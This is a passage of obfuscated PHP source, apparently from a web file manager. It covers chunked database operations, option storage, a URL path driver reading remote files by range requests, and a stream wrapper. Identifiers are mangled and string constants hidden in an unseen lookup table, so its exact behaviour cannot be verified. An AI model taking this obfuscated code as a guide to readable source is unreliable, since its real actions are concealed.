saveAllChunkMake($ñ±ˆòÔÇ) { $Áßüô‰° =& $_SERVER[¤øïŠ‹²]; $‚ÉĞÇùã = self::SQL_WHERE_IN_CHUNK; $ñ±ˆòÔÇ = is_array($ñ±ˆòÔÇ) ? $ñ±ˆòÔÇ : array(); $å˜Áî = array(); $£Öƒºà· = ceil(count($ñ±ˆòÔÇ) / $‚ÉĞÇùã); for ($²âÚ¿€ù = 0; $²âÚ¿€ù < $£Öƒºà·; $²âÚ¿€ù++) { $İúÓëºÕ = array(); $À©¦–Û– = array_slice($ñ±ˆòÔÇ, $²âÚ¿€ù * $‚ÉĞÇùã, $‚ÉĞÇùã); foreach ($À©¦–Û– as $™ÜšÎş®) { if (!is_array($™ÜšÎş®) || count($™ÜšÎş®) < 4 || count($™ÜšÎş®) % 2 != 0) { continue; } $Ø´ñ¢„î = array(); for ($È¬‡ûûÍ = 2; $È¬‡ûûÍ < count($™ÜšÎş®); $È¬‡ûûÍ += 2) { $Ø´ñ¢„î[$™ÜšÎş®[$È¬‡ûûÍ]] = $™ÜšÎş®[$È¬‡ûûÍ + 1]; } $İúÓëºÕ[] = array($Áßüô‰°[466] => $™ÜšÎş®[0], $Áßüô‰°[467] => $™ÜšÎş®[1], $Áßüô‰°[468] => $Ø´ñ¢„î); } $å˜Áî[] = $İúÓëºÕ; } return $å˜Áî; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($œñÆ­Ü¸ = false, $³àï°ÀÎ = false) { $this->_chunkEvent = $œñÆ­Ü¸; $this->_chunkEventParam = $³àï°ÀÎ; } private function chunkEventCheck($ßÃì½Ÿ») { if (!$this->_chunkEvent) { return; } $ÑœãÊÂ“ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÑœãÊÂ“[$_SERVER[¤øïŠ‹²][477]] = $ßÃì½Ÿ»; Hook::trigger($this->_chunkEvent, $ÑœãÊÂ“); } public function addAll($¶¶¯Ô‹ô, $ÄŠ±æÀ¥ = array(), $¥ê‚µŠ = false) { $’©µñÄé =& $_SERVER[¤øïŠ‹²]; ignore_timeout(); $­Ëè“‹– = self::SQL_WHERE_IN_CHUNK; if (empty($¶¶¯Ô‹ô)) { $this->error = think_lang($’©µñÄé[361]); return !1; } $ÄŠ±æÀ¥ = $this->_parseOptions($ÄŠ±æÀ¥); foreach ($¶¶¯Ô‹ô as $‚Ü¥ë¢¢ => $ÎŠŒ¥Å) { $¶¶¯Ô‹ô[$‚Ü¥ë¢¢] = $this->_facade($ÎŠŒ¥Å); $this->_beforeInsert($¶¶¯Ô‹ô[$‚Ü¥ë¢¢], $ÄŠ±æÀ¥); } if (method_exists($this->db, $’©µñÄé[362])) { for ($À·¸Ù™â = 0; $À·¸Ù™â < count($¶¶¯Ô‹ô); $À·¸Ù™â += $­Ëè“‹–) { $º¤»£ = array_slice($¶¶¯Ô‹ô, $À·¸Ù™â, $­Ëè“‹–); if (!is_array($º¤»£) || count($º¤»£) == 0) { break; } $‘¶—»È = $this->db->insertAll($º¤»£, $ÄŠ±æÀ¥, $¥ê‚µŠ); $this->chunkEventCheck(count($º¤»£)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¶¶¯Ô‹ô as $‚Ü¥ë¢¢ => $ÎŠŒ¥Å) { $‘¶—»È = $this->db->insert($ÎŠŒ¥Å, $ÄŠ±æÀ¥, $¥ê‚µŠ); } $this->commit(); } if (!1 !== $‘¶—»È) { $†—©¬² = $this->getLastInsID(); if ($†—©¬²) { return $†—©¬²; } } return $‘¶—»È; } public function save($™»Ä¨ç× = '', $í»Š¼öÃ = array()) { $°Ú½ë =& $_SERVER[¤øïŠ‹²]; $¤—ìøÅš = self::SQL_WHERE_IN_CHUNK; $£¬˜¦ = $this->optionsValue(); $˜ÔÓÆÔÚ = $this->findWhereField($£¬˜¦); if (!$˜ÔÓÆÔÚ) { return parent::save($™»Ä¨ç×, $í»Š¼öÃ); } $¡À‘ÅÂ = 0; $ŞÏá¨®· = $£¬˜¦[$°Ú½ë[365]][$˜ÔÓÆÔÚ][1]; $ŞÏá¨®· = is_array($ŞÏá¨®·) ? $ŞÏá¨®· : array(); $½ì©ôÚ = count($ŞÏá¨®·); for ($ì¿ïüÈÖ = 0; $ì¿ïüÈÖ < $½ì©ôÚ; $ì¿ïüÈÖ += $¤—ìøÅš) { $ğõ¢Úüğ = array_slice($ŞÏá¨®·, $ì¿ïüÈÖ, $¤—ìøÅš); if (!is_array($ğõ¢Úüğ) || count($ğõ¢Úüğ) == 0) { break; } $£¬˜¦[$°Ú½ë[365]][$˜ÔÓÆÔÚ][1] = $ğõ¢Úüğ; $this->optionsValue($£¬˜¦); $¡À‘ÅÂ += parent::save($™»Ä¨ç×, $í»Š¼öÃ); $this->chunkEventCheck(count($ğõ¢Úüğ)); } $this->chunkEventSet(); return $¡À‘ÅÂ; } public function add($İĞĞı¨š = '', $°â²£³¨ = array(), $óÓè‡œÍ = false) { if ($this->addTaskStatus && is_array($İĞĞı¨š)) { $this->addTaskData[] = $İĞĞı¨š; return; } return parent::add($İĞĞı¨š, $°â²£³¨, $óÓè‡œÍ); } public function parseWhereLike($¦ù¼È”Æ, $³ÅÛ‡İ = '', $±å§Í¦‘ = false, &$×™êä¼ = false) { $›Åˆ·‘· =& $_SERVER[¤øïŠ‹²]; $¡—êÊëê = $GLOBALS[$›Åˆ·‘·[6]][$›Åˆ·‘·[478]]; if (!$¡—êÊëê[$›Åˆ·‘·[479]]) { return $¦ù¼È”Æ; } if (!is_array($¦ù¼È”Æ)) { return $¦ù¼È”Æ; } $üÜ¦ãÃş = array(); $Êñ¾Ášà = 0; foreach ($¦ù¼È”Æ as $ş—µÎÒÓ => $¢Ã¢ãÚ‹) { if (is_array($¢Ã¢ãÚ‹) && count($¢Ã¢ãÚ‹) == 2 && $¢Ã¢ãÚ‹[0] == $›Åˆ·‘·[480] && is_string($¢Ã¢ãÚ‹[1]) && substr($¢Ã¢ãÚ‹[1], 0, 1) == $›Åˆ·‘·[481] && substr($¢Ã¢ãÚ‹[1], strlen($¢Ã¢ãÚ‹[1]) - 1, 1) == $›Åˆ·‘·[481]) { $×™êä¼ = !0; $áÜ½£Ìä = is_string($ş—µÎÒÓ) ? $ş—µÎÒÓ : $³ÅÛ‡İ; $úšÃ = substr($¢Ã¢ãÚ‹[1], 1, strlen($¢Ã¢ãÚ‹[1]) - 2); $úšÃ = $this->db->escapeString($úšÃ); if (!strpos($áÜ½£Ìä, $›Åˆ·‘·[10])) { $áÜ½£Ìä = $›Åˆ·‘·[482] . $áÜ½£Ìä . $›Åˆ·‘·[482]; } $¡åè åÙ = $›Åˆ·‘·[233] . $úšÃ . $›Åˆ·‘·[233]; $úšÃ = str_replace(array($›Åˆ·‘·[10], $›Åˆ·‘·[483], $›Åˆ·‘·[11]), $›Åˆ·‘·[484], $úšÃ); if ($¡—êÊëê[$›Åˆ·‘·[485]]) { $¡åè åÙ = $›Åˆ·‘·[486] . $úšÃ . $›Åˆ·‘·[487]; if ($¡—êÊëê[$›Åˆ·‘·[488]]) { $¡åè åÙ = $›Åˆ·‘·[487] . $úšÃ . $›Åˆ·‘·[486]; } } $üÜ¦ãÃş[$Êñ¾Ášà] = $›Åˆ·‘·[489] . $áÜ½£Ìä . $›Åˆ·‘·[490] . $¡åè åÙ . $›Åˆ·‘·[491]; $Êñ¾Ášà++; continue; } if (is_array($¢Ã¢ãÚ‹)) { $³ÅÛ‡İ = is_string($ş—µÎÒÓ) ? $ş—µÎÒÓ : $³ÅÛ‡İ; $¢Ã¢ãÚ‹ = $this->parseWhereLike($¢Ã¢ãÚ‹, $³ÅÛ‡İ, !0, $×™êä¼); } if (is_numeric($ş—µÎÒÓ)) { $üÜ¦ãÃş[$Êñ¾Ášà] = $¢Ã¢ãÚ‹; $Êñ¾Ášà++; } else { $üÜ¦ãÃş[$ş—µÎÒÓ] = $¢Ã¢ãÚ‹; } } if ($×™êä¼ && !$±å§Í¦‘) { } return $üÜ¦ãÃş; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($úÓ¡ŒÜË = array()) { $üï“ãŸ =& $_SERVER[¤øïŠ‹²]; $€ÚŸÈ’ş = self::SQL_WHERE_IN_CHUNK; $¥ˆóşæ = $this->optionsValue(); $ÛşÜˆì‚ = $this->findWhereField($¥ˆóşæ); if (!$ÛşÜˆì‚ || isset($¥ˆóşæ[$üï“ãŸ[380]]) || isset($¥ˆóşæ[$üï“ãŸ[440]])) { return parent::select($úÓ¡ŒÜË); } $æÓÒÕÓß = $¥ˆóşæ[$üï“ãŸ[365]][$ÛşÜˆì‚][1]; $æÓÒÕÓß = is_array($æÓÒÕÓß) ? $æÓÒÕÓß : array(); $Éá²š½ü = null; for ($ùš°Ú¯ø = 0; $ùš°Ú¯ø < count($æÓÒÕÓß); $ùš°Ú¯ø += $€ÚŸÈ’ş) { $ŠÄ¦˜ = array_slice($æÓÒÕÓß, $ùš°Ú¯ø, $€ÚŸÈ’ş); if (!is_array($ŠÄ¦˜) || count($ŠÄ¦˜) == 0) { break; } $¥ˆóşæ[$üï“ãŸ[365]][$ÛşÜˆì‚][1] = $ŠÄ¦˜; $this->optionsValue($¥ˆóşæ); $·ñŸ©çÑ = parent::select($úÓ¡ŒÜË); if (!$·ñŸ©çÑ) { continue; } $Éá²š½ü = is_array($Éá²š½ü) ? $Éá²š½ü : array(); $Éá²š½ü = array_merge($Éá²š½ü, $·ñŸ©çÑ); } return $Éá²š½ü; } public function delete($˜µ‚€Ÿº = array()) { $ô¸‰µÉ— =& $_SERVER[¤øïŠ‹²]; $€¤¦™ = self::SQL_WHERE_IN_CHUNK; $é±İ‰ÒÊ = $this->optionsValue(); $ú«›…›¹ = $this->findWhereField($é±İ‰ÒÊ); if (!$ú«›…›¹) { return parent::delete($˜µ‚€Ÿº); } $¯çùï§— = 0; $é»ĞÕ¹¯ = $é±İ‰ÒÊ[$ô¸‰µÉ—[365]][$ú«›…›¹][1]; $é»ĞÕ¹¯ = is_array($é»ĞÕ¹¯) ? $é»ĞÕ¹¯ : array(); for ($ë•çí– = 0; $ë•çí– < count($é»ĞÕ¹¯); $ë•çí– += $€¤¦™) { $ÜÔÚ‹ßŠ = array_slice($é»ĞÕ¹¯, $ë•çí–, $€¤¦™); if (!is_array($ÜÔÚ‹ßŠ) || count($ÜÔÚ‹ßŠ) == 0) { break; } $é±İ‰ÒÊ[$ô¸‰µÉ—[365]][$ú«›…›¹][1] = $ÜÔÚ‹ßŠ; $this->optionsValue($é±İ‰ÒÊ); $¯çùï§— += parent::delete($˜µ‚€Ÿº); } return $¯çùï§—; } private function findWhereField($óÎøË) { $¹õªô« =& $_SERVER[¤øïŠ‹²]; $²ğşŸœé = self::SQL_WHERE_IN_CHUNK; if (!is_array($óÎøË) || !is_array($óÎøË[$¹õªô«[365]])) { return !1; } foreach ($óÎøË[$¹õªô«[365]] as $×öˆ£É« => $óìÑà¬Ê) { if (is_array($óìÑà¬Ê) && isset($óìÑà¬Ê[0]) && is_string($óìÑà¬Ê[0]) && strtolower($óìÑà¬Ê[0]) == $¹õªô«[7] && is_array($óìÑà¬Ê[1]) && count($óìÑà¬Ê[1]) > $²ğşŸœé) { ignore_timeout(); return $×öˆ£É«; } } return !1; } public function setMasterDB($ùåí¬ı• = true) { think_config($_SERVER[¤øïŠ‹²][492], $ùåí¬ı•); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\x6d\117\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($øÚñãƒÌ = false, $é„…¢Ğ« = "\155\157\144\151\146\171\x54\x69\x6d\145", $­Éè‘ = false) { $šãó¼ó =& $_SERVER[¤øïŠ‹²]; $­«íØúá = Model($this->modelType)->get(!1, $this->optionType, !0); $µ„Íì¸÷ = array_values($­«íØúá); if ($µ„Íì¸÷ && $µ„Íì¸÷[0] && !is_array($µ„Íì¸÷[0])) { Model($this->modelType)->cacheRemove($this->optionType); $­«íØúá = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$­«íØúá) { return $øÚñãƒÌ ? null : array(); } if (!$øÚñãƒÌ && $øÚñãƒÌ !== $šãó¼ó[241]) { $­«íØúá = array_filter(array_values($­«íØúá)); return array_sort_by($­«íØúá, $é„…¢Ğ«, $­Éè‘, $šãó¼ó[493]); } return $­«íØúá[$šãó¼ó[494] . $øÚñãƒÌ]; } public function insert($ØÚÅ–ó¡) { $¢ÏŒÀ³· =& $_SERVER[¤øïŠ‹²]; $ØÚÅ–ó¡ = array_field_key($ØÚÅ–ó¡, $this->field); $è÷¬íÉ÷ = Model($this->modelType)->get($¢ÏŒÀ³·[495], $this->optionType . $¢ÏŒÀ³·[496]); $è÷¬íÉ÷ = $è÷¬íÉ÷ ? $è÷¬íÉ÷ : 0; $ØÚÅ–ó¡[$¢ÏŒÀ³·[493]] = ++$è÷¬íÉ÷; $ØÚÅ–ó¡[$¢ÏŒÀ³·[244]] = time(); $ØÚÅ–ó¡[$¢ÏŒÀ³·[99]] = time(); Model($this->modelType)->set($¢ÏŒÀ³·[495], $è÷¬íÉ÷, $this->optionType . $¢ÏŒÀ³·[496]); Model($this->modelType)->set($¢ÏŒÀ³·[494] . $è÷¬íÉ÷, $ØÚÅ–ó¡, $this->optionType); return $è÷¬íÉ÷; } public function insertArr($˜ßƒÄÀ) { $æÉÊöá¸ =& $_SERVER[¤øïŠ‹²]; if (!$˜ßƒÄÀ || !is_array($˜ßƒÄÀ)) { return !1; } $ğ÷ã‰ĞÖ = Model($this->modelType)->get($æÉÊöá¸[495], $this->optionType . $æÉÊöá¸[496]); $ğ÷ã‰ĞÖ = $ğ÷ã‰ĞÖ ? $ğ÷ã‰ĞÖ : 0; $—¶áª‡‰ = array(); foreach ($˜ßƒÄÀ as $…òÍ¼”) { $€ó¾­ƒµ = array_field_key($…òÍ¼”, $this->field); $€ó¾­ƒµ[$æÉÊöá¸[493]] = ++$ğ÷ã‰ĞÖ; $€ó¾­ƒµ[$æÉÊöá¸[244]] = time(); $€ó¾­ƒµ[$æÉÊöá¸[99]] = time(); $—¶áª‡‰[$æÉÊöá¸[494] . $ğ÷ã‰ĞÖ] = $€ó¾­ƒµ; } Model($this->modelType)->set($æÉÊöá¸[495], $ğ÷ã‰ĞÖ, $this->optionType . $æÉÊöá¸[496]); Model($this->modelType)->set($—¶áª‡‰, !1, $this->optionType); return $ğ÷ã‰ĞÖ; } public function update($¯‰ ŒÁ”, $¢ŸíÂÂ¯) { $©í°Ğï =& $_SERVER[¤øïŠ‹²]; $¢ŸíÂÂ¯ = array_field_key($¢ŸíÂÂ¯, $this->field); $ãˆÒ™üä = $this->listData($¯‰ ŒÁ”); if (!$ãˆÒ™üä || !$¯‰ ŒÁ”) { return !1; } $¢ŸíÂÂ¯ = array_merge($ãˆÒ™üä, $¢ŸíÂÂ¯); $¢ŸíÂÂ¯[$©í°Ğï[99]] = time(); return Model($this->modelType)->set($©í°Ğï[494] . $¯‰ ŒÁ”, $¢ŸíÂÂ¯, $this->optionType); } public function remove($¦ßß¹‰) { if (!$¦ßß¹‰) { return !1; } return Model($this->modelType)->remove($_SERVER[¤øïŠ‹²][494] . $¦ßß¹‰, $this->optionType); } public function removeArr($¨ÏËè‚…) { if (!$¨ÏËè‚…) { return !0; } $ÆñÉ¥ = array(); foreach ($¨ÏËè‚… as $î€ŞØÔæ) { $ÆñÉ¥[] = $_SERVER[¤øïŠ‹²][494] . $î€ŞØÔæ; } return Model($this->modelType)->removeArr($ÆñÉ¥, $this->optionType); } public function clear() { $İíÖæ¢ =& $_SERVER[¤øïŠ‹²]; Model($this->modelType)->remove($İíÖæ¢[495], $this->optionType . $İíÖæ¢[496]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ë˜ô½, $Ú‡çééĞ) { if (!$Ú‡çééĞ) { return !1; } $û‡ÜÜ¦ = $this->listData(); $û‡ÜÜ¦ = array_to_keyvalue($û‡ÜÜ¦, $Ë˜ô½); return isset($û‡ÜÜ¦[$Ú‡çééĞ]) ? $û‡ÜÜ¦[$Ú‡çééĞ] : !1; } public function findByName($Ş¿ÏÔÜ¸) { return $this->findByKey($_SERVER[¤øïŠ‹²][32], $Ş¿ÏÔÜ¸); } protected function resetData($½Êû©òÈ) { $‹˜´³¬Â =& $_SERVER[¤øïŠ‹²]; if (!$½Êû©òÈ) { return; } $½Êû©òÈ = is_array($½Êû©òÈ) ? $½Êû©òÈ : array(); $äè¥‚‚Ó = array(); for ($øáöˆ®ˆ = 0; $øáöˆ®ˆ < count($½Êû©òÈ); $øáöˆ®ˆ++) { if (!$½Êû©òÈ[$øáöˆ®ˆ] || !$½Êû©òÈ[$øáöˆ®ˆ][$‹˜´³¬Â[493]]) { continue; } $äè¥‚‚Ó[$‹˜´³¬Â[494] . $½Êû©òÈ[$øáöˆ®ˆ][$‹˜´³¬Â[493]]] = $½Êû©òÈ[$øáöˆ®ˆ]; } return Model($this->modelType)->set($äè¥‚‚Ó, !1, $this->optionType); } private function getAutoName($•„É¸”Ù) { $¹¬˜¢ıò = array_to_keyvalue($this->listData(), $_SERVER[¤øïŠ‹²][32]); if (!$¹¬˜¢ıò || !isset($¹¬˜¢ıò[$•„É¸”Ù])) { return $•„É¸”Ù; } for ($„Ÿï• = 1; $„Ÿï• < count($¹¬˜¢ıò); $„Ÿï•++) { $·™ê¬Û = $•„É¸”Ù . "\50{$„Ÿï•}\x29"; if (!isset($¹¬˜¢ıò[$·™ê¬Û])) { return $·™ê¬Û; } } return $·™ê¬Û; } } goto cÌ•Ü›î†Ø; a…›ª‰èò¿: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($•‰ÜçøÜ = false) { } public function exist($“ÜÅ¢Üº) { $‘ºÈÊŸ– = $this->info($“ÜÅ¢Üº); return $‘ºÈÊŸ–[$_SERVER[¤øïŠ‹²][245]]; } public function isFile($Êø…ü) { $ç÷’åƒŸ = $this->info($Êø…ü); return $ç÷’åƒŸ[$_SERVER[¤øïŠ‹²][245]]; } public function isFolder($â¤ÃÎ) { return !1; } public function size($åë¿“ÅÚ) { $æéá»è = $this->info($åë¿“ÅÚ); return $æéá»è[$_SERVER[¤øïŠ‹²][90]]; } public function info($Åï×Ôß¨) { return $this->infoParse($Åï×Ôß¨); } public function infoAuth($ÊöŞĞï”) { return $this->infoParse($ÊöŞĞï”); } public function infoWithChildren($¡Åñî“) { return $this->infoParse($¡Åñî“); } public function infoFull($ÌåØ¢è’) { return $this->infoParse($ÌåØ¢è’); } private function infoParse($ğùË¡·Õ) { $ÜÈÔğ´× =& $_SERVER[¤øïŠ‹²]; $ƒ‚Ü’ô“ = $this->header($ğùË¡·Õ); if (!$ƒ‚Ü’ô“ || !$ƒ‚Ü’ô“[$ÜÈÔğ´×[851]]) { return !1; } $ŞÓ‚„¬æ = _get($ƒ‚Ü’ô“, $ÜÈÔğ´×[424], 0); $œ±•èãš = array($ÜÈÔğ´×[32] => $ƒ‚Ü’ô“[$ÜÈÔğ´×[32]], $ÜÈÔğ´×[98] => $ğùË¡·Õ, $ÜÈÔğ´×[33] => $ÜÈÔğ´×[243], $ÜÈÔğ´×[90] => intval($ŞÓ‚„¬æ), $ÜÈÔğ´×[179] => get_path_ext($ƒ‚Ü’ô“[$ÜÈÔğ´×[32]]), $ÜÈÔğ´×[1612] => $ŞÓ‚„¬æ > 0 && $ƒ‚Ü’ô“[$ÜÈÔğ´×[1758]], $ÜÈÔğ´×[1613] => !1); return $œ±•èãš; } private function header($Ş”ğØé¢) { $í¼ã¬™õ =& $_SERVER[¤øïŠ‹²]; if (isset(self::$_cacheHeader[$Ş”ğØé¢])) { return self::$_cacheHeader[$Ş”ğØé¢]; } $ÔâÍƒØ… = isset($GLOBALS[$í¼ã¬™õ[1759]]) ? $GLOBALS[$í¼ã¬™õ[1759]] : !1; $GLOBALS[$í¼ã¬™õ[1759]] = !0; self::$_cacheHeader[$Ş”ğØé¢] = url_header($Ş”ğØé¢); $GLOBALS[$í¼ã¬™õ[1759]] = $ÔâÍƒØ…; return self::$_cacheHeader[$Ş”ğØé¢]; } public function hashSimple($–Ö©•˜ë, $å©™¢È­ = false) { $êç¬­¿Ç =& $_SERVER[¤øïŠ‹²]; $À¨ö“ = $this->info($–Ö©•˜ë); if (!$À¨ö“ || !$À¨ö“[$êç¬­¿Ç[245]]) { return !1; } $®½º¿ôÅ = $À¨ö“[$êç¬­¿Ç[90]]; $—–»‚Ø† = 200; $¤¸ä³ó€ = 50; if ($®½º¿ôÅ <= $—–»‚Ø† * $¤¸ä³ó€) { return md5($this->fileSubstr($–Ö©•˜ë, 0, $®½º¿ôÅ)) . $®½º¿ôÅ; } $Š¡±Çï° = intval($®½º¿ôÅ / $¤¸ä³ó€); $û¢Ä›ê¦ = $êç¬­¿Ç[12]; $ÁÓÁÚç• = timeFloat(); $œ¤‰ı•ø = 15; for ($ü«…Ä«û = 0; $ü«…Ä«û < $¤¸ä³ó€; $ü«…Ä«û++) { if (timeFloat() - $ÁÓÁÚç• > $œ¤‰ı•ø) { return !1; } $ÁŞÕ•«İ = $this->fileSubstr($–Ö©•˜ë, $Š¡±Çï° * $ü«…Ä«û, $—–»‚Ø†); if (!$ÁŞÕ•«İ) { return !1; } $û¢Ä›ê¦ .= $ÁŞÕ•«İ; } $û¢Ä›ê¦ .= $this->fileSubstr($–Ö©•˜ë, $®½º¿ôÅ - $—–»‚Ø†, $—–»‚Ø†); return md5($û¢Ä›ê¦) . $®½º¿ôÅ; } public function getContent($öùÃ˜öá) { return $this->fileSubstr($öùÃ˜öá); } public function fileSubstr($ŞÄ¼Ûé÷, $€ õ¶®× = 0, $®ûêŸßÏ = -1) { $ØÜÃë·ª =& $_SERVER[¤øïŠ‹²]; $è’¿ìÛ = $this->info($ŞÄ¼Ûé÷); if (!$è’¿ìÛ || !$è’¿ìÛ[$ØÜÃë·ª[245]] && $è’¿ìÛ[$ØÜÃë·ª[90]] > 1024 * 1024 * 10) { return !1; } if ($®ûêŸßÏ === -1) { $®ûêŸßÏ = $è’¿ìÛ[$ØÜÃë·ª[90]]; } if ($®ûêŸßÏ == 0) { return $ØÜÃë·ª[12]; } $éÖÃÑâ¶ = array($ØÜÃë·ª[1760] . $€ õ¶®× . $ØÜÃë·ª[891] . ($€ õ¶®× + $®ûêŸßÏ - 1)); $ğé¯“éÕ = url_request($ŞÄ¼Ûé÷, $ØÜÃë·ª[1555], !1, $éÖÃÑâ¶, !1, !1, 30); return $ğé¯“éÕ[$ØÜÃë·ª[1339]] ? $ğé¯“éÕ[$ØÜÃë·ª[1339]] : $ØÜÃë·ª[12]; } public function download($ğ¯îß, $Ù½„·¤) { Downloader::start($ğ¯îß, $Ù½„·¤); return $Ù½„·¤; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($®Ûş²å, $¡öìî«Ã = '') { $this->info = $this->info($®Ûş²å); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¤øïŠ‹²][98]]; $this->pathOpen = $®Ûş²å; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$®Ûş²å])) { self::$_chunkBuffer[$®Ûş²å] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ŠÉöËå®) { $èüêÃ = $this->fileSubstr($this->pose, $ŠÉöËå®); $this->pose += strlen($èüêÃ); return $èüêÃ; } public function stream_tell() { return $this->pose; } public function stream_seek($ïğé¥•, $’øôØ Ç) { $šåìò¥Î =& $_SERVER[¤øïŠ‹²]; if ($’øôØ Ç == SEEK_SET) { $this->pose = $ïğé¥•; } else { if ($’øôØ Ç == SEEK_CUR) { $this->pose += $ïğé¥•; } else { if ($’øôØ Ç == SEEK_END) { $this->pose = $this->info[$šåìò¥Î[90]] + intval($ïğé¥•); } } } if ($ïğé¥• < 0) { $this->pose = $this->info[$šåìò¥Î[90]] + $ïğé¥•; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¤øïŠ‹²][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ßı¨ğ²‹, $¼¸»ƒØœ) { $Õ·ÅñÖµ =& $_SERVER[¤øïŠ‹²]; $ÄšïÖ É = $this->info($ßı¨ğ²‹); return array($Õ·ÅñÖµ[1461] => 0, $Õ·ÅñÖµ[1761] => 0, $Õ·ÅñÖµ[16] => 32768 + 511, $Õ·ÅñÖµ[1762] => 0, $Õ·ÅñÖµ[1763] => 0, $Õ·ÅñÖµ[1764] => 0, $Õ·ÅñÖµ[1765] => 0, $Õ·ÅñÖµ[90] => $ÄšïÖ É[$Õ·ÅñÖµ[90]], $Õ·ÅñÖµ[1766] => $ÄšïÖ É[$Õ·ÅñÖµ[1611]], $Õ·ÅñÖµ[1723] => $ÄšïÖ É[$Õ·ÅñÖµ[99]], $Õ·ÅñÖµ[1722] => $ÄšïÖ É[$Õ·ÅñÖµ[244]], $Õ·ÅñÖµ[1767] => 0, $Õ·ÅñÖµ[1768] => 0); } static $fileInfo = array(); public function info($ÈÏšºÖ) { $°öÅë§” = $_SERVER[¤øïŠ‹²][1769]; if (isset(self::$fileInfo[$ÈÏšºÖ])) { return self::$fileInfo[$ÈÏšºÖ]; } if (substr($ÈÏšºÖ, 0, strlen($°öÅë§”)) != $°öÅë§”) { return !1; } self::$fileInfo[$ÈÏšºÖ] = IO::info(substr($ÈÏšºÖ, strlen($°öÅë§”))); return self::$fileInfo[$ÈÏšºÖ]; } public static function read($ÙÁä¬’, $ºÒ«¼ƒ¤, $»±áô¡) { if (!isset(self::$_fopenCache[$ÙÁä¬’])) { $û¿ñÈ÷ = new StreamWrapperIO(); $û¿ñÈ÷->stream_open($ÙÁä¬’); self::$_fopenCache[$ÙÁä¬’] = $û¿ñÈ÷; } $û¿ñÈ÷ = self::$_fopenCache[$ÙÁä¬’]; return $û¿ñÈ÷->fileSubstr($ºÒ«¼ƒ¤, $»±áô¡); } public static function _read($‡˜ê¸×ç, $äò›Û£ß, $¥—¿ÄÃ) { $üÑ» ©µ =& $_SERVER[¤øïŠ‹²]; $‘îò‹Ç± = fopen($‡˜ê¸×ç, $üÑ» ©µ[1615]); if (!$‘îò‹Ç±) { return $üÑ» ©µ[12]; } $ğ«á©©Œ = 8192; fseek($‘îò‹Ç±, $äò›Û£ß, SEEK_SET); $¿å…å¦à = $üÑ» ©µ[12]; $ÒÑÒ¨ = 0; while ($ÒÑÒ¨ < $¥—¿ÄÃ) { $â‹šêÕ³ = min($ğ«á©©Œ, $¥—¿ÄÃ - $ÒÑÒ¨); $¿å…å¦à .= fread($‘îò‹Ç±, $â‹šêÕ³); $ÒÑÒ¨ += $â‹šêÕ³; } fclose($‘îò‹Ç±); return $¿å…å¦à; } public function fileSubstr($ª‹¹Í‡, $ûçò½ïù) { $ÓşÍÑ¦ê =& $_SERVER[¤øïŠ‹²]; $¬Ê–ŒÏë = $this->info[$ÓşÍÑ¦ê[90]]; $êÓõ©Öä = $ª‹¹Í‡; $š¢»—í = $ûçò½ïù; if ($ª‹¹Í‡ < 0) { $ª‹¹Í‡ = $¬Ê–ŒÏë + $ª‹¹Í‡; } if ($ûçò½ïù === !1) { $ûçò½ïù = $¬Ê–ŒÏë - $ª‹¹Í‡; } if ($ª‹¹Í‡ + $ûçò½ïù > $¬Ê–ŒÏë) { $ûçò½ïù = $¬Ê–ŒÏë - $ª‹¹Í‡; } if ($ûçò½ïù <= 0) { return $ÓşÍÑ¦ê[12]; } if ($ª‹¹Í‡ < 0 || $ª‹¹Í‡ >= $¬Ê–ŒÏë || $ûçò½ïù <= 0 || $ûçò½ïù > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\154\145\x52\x65\x61\144\x20\x65\162\x72\157\x72\41\40\x73\x74\x61\162\x74\x3d{$ª‹¹Í‡}\73\154\x65\x6e\x67\164\150\75{$ûçò½ïù}\73\x20\x73\x69\172\145\75{$¬Ê–ŒÏë}\73"); } $à¸ªŒª› = 64 * 1024; $¨»Û¢Ê =& self::$_chunkBuffer[$this->path]; if (!$¨»Û¢Ê) { $¨»Û¢Ê = array(); } $èÂŸ’³¯ = 0; $ÓŸ–è°¡ = 0; $ üÎ¬ÜÛ = $ÓşÍÑ¦ê[12]; foreach ($¨»Û¢Ê as $èÂŸ’³¯ => $ üÎ¬ÜÛ) { $èÂŸ’³¯ = intval($èÂŸ’³¯); $ÓŸ–è°¡ = $èÂŸ’³¯ + strlen($ üÎ¬ÜÛ); if ($ª‹¹Í‡ >= $ÓŸ–è°¡) { continue; } if ($ª‹¹Í‡ >= $èÂŸ’³¯ && $ª‹¹Í‡ + $ûçò½ïù <= $ÓŸ–è°¡) { return substr($ üÎ¬ÜÛ, $ª‹¹Í‡ - $èÂŸ’³¯, $ûçò½ïù); } break; } if (count($¨»Û¢Ê) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÓşÍÑ¦ê[1770], $ÓşÍÑ¦ê[1771] . count($¨»Û¢Ê) . "\x3b\163\x74\x61\x72\x74\75{$ª‹¹Í‡}\54\x6c\x65\156\147\x74\x68\75{$ûçò½ïù}\73\160\x6f\x73\x65\x3a{$èÂŸ’³¯}\176{$ÓŸ–è°¡}"); throw new Exception($ÓşÍÑ¦ê[1772]); } 